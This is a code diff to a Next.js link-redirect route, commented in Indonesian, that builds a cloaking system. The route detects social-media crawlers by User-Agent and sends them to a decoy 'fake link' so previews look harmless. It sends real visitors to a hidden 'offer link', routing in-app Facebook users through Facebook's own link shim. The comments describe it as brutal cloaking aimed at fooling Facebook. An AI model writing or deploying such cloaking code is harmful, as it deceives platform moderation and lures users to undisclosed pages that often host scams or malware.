@@ -12,7 +12,7 @@ export async function GET(request, { params }) {
     // 1. Baca identitas (User-Agent)
     const userAgent = request.headers.get('user-agent') || '';
 
-    // 2. Deteksi Bot Sosial Media MURNI (Scraper)
+    // 2. Deteksi Bot Sosial Media (MURNI SCRAPER)
     const isBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|googlebot|bingbot|slurp|spider/i.test(userAgent);
 
     // 3. Cari data link
@@ -27,11 +27,6 @@ export async function GET(request, { params }) {
 
     const data = result.rows[0];
 
-    // ==========================================
-    // SENJATA ANTI-CACHE (Angka Acak)
-    // ==========================================
-    const randomNum = Math.floor(Math.random() * 10000000);
-
     const noCacheHeaders = {
       'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
       'Pragma': 'no-cache',
@@ -39,24 +34,21 @@ export async function GET(request, { params }) {
     };
 
     // ==========================================
-    // LOGIKA CLOAKING FINAL
+    // LOGIKA CLOAKING BRUTAL SESUAI KONSEP LO
     // ==========================================
 
     if (isBot) {
-      // BOT FB -> Lempar pakai 307 + Cache Buster (Biar FB gak nyimpen jejak)
+      // BOT FB -> Lempar murni ke Fake Link biar domain di preview 100% sempurna
       let fakeUrl = data.fake_link || 'google.com'; 
       if (!fakeUrl.startsWith('http')) fakeUrl = 'https://' + fakeUrl;
       
-      const separator = fakeUrl.includes('?') ? '&' : '?';
-      fakeUrl = `${fakeUrl}${separator}cb=${randomNum}`;
-      
       return NextResponse.redirect(new URL(fakeUrl), { 
-        status: 307, // KUNCI MUTLAK BIAR FB GAK NYIMPEN URL FAKE
+        status: 302, 
         headers: noCacheHeaders 
       });
       
     } else {
-      // MANUSIA (FB Biru, FB Lite, dll) -> JS Redirect (Biar gak blank hitam)
+      // MANUSIA ASLI -> Hitung Klik & Eksekusi Jurus Paksa Eksternal
       await turso.execute({
         sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
         args: [shortcode]
@@ -65,32 +57,38 @@ export async function GET(request, { params }) {
       let offerUrl = data.offer_link || 'google.com';
       if (!offerUrl.startsWith('http')) offerUrl = 'https://' + offerUrl;
       
-      const separator = offerUrl.includes('?') ? '&' : '?';
-      offerUrl = `${offerUrl}${separator}cb=${randomNum}`;
+      // JURUS NOTIF BAWAAN FB (FB LINK SHIM)
+      const encodedOffer = encodeURIComponent(offerUrl);
+      const fbShimUrl = `https://l.facebook.com/l.php?u=${encodedOffer}`;
       
-      // Halaman putih super ringan yang langsung pindah dalam hitungan milidetik
+      // Halaman eksekutor untuk menendang user berdasarkan browser mereka
       const html = `
         <!DOCTYPE html>
         <html>
-          <head>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <meta http-equiv="refresh" content="0;url=${offerUrl}">
-            <title>Loading...</title>
-            <script>
+        <head>
+          <meta charset="utf-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <script>
+            // Deteksi apakah manusia ini buka dari dalam aplikasi FB
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            var isFBApp = (ua.indexOf("FBAV") > -1 || ua.indexOf("FBAN") > -1);
+
+            if (isFBApp) {
+              // Jika buka di FB Biru/Lite: Paksa munculin Notif Bawaan FB
+              window.location.replace("${fbShimUrl}");
+            } else {
+              // Jika buka di Chrome/Browser Luar: Langsung sikat ke Offer Link
               window.location.replace("${offerUrl}");
-            </script>
-          </head>
-          <body style="background-color: #ffffff;"></body>
+            }
+          </script>
+        </head>
+        <body style="background-color: #ffffff;"></body>
         </html>
       `;
 
       return new NextResponse(html, {
-        status: 200, // FB mengira ini halaman biasa jadi gak bakal nge-blank
-        headers: {
-          'Content-Type': 'text/html',
-          ...noCacheHeaders
-        },
+        status: 200, 
+        headers: { 'Content-Type': 'text/html', ...noCacheHeaders },
       });
     }
 
